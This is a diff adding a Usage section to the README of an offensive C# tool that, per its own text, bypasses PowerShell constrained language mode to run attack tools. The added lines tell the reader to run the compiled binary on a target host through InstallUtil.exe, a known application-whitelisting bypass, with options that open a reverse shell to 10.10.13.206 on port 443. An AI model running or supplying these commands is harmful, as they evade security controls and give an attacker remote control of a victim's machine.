@@ -21,3 +21,10 @@ to change the PowerShell language mode to full in order to run attack tools." [[
 The project is written in C#. All the source (few lines of codes though) is committed: .csproj, .sln ...
 You should be able to easily compile and build the binary with the default configuration Debug/X64.
 
+## Usage
+Well, nothing new here as we're going to use the old and well-known trick of "InstallUtil.exe" to bypass execution of exe.
+Once you've compiled the binary, issue the below command on the target host.
+
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
+```
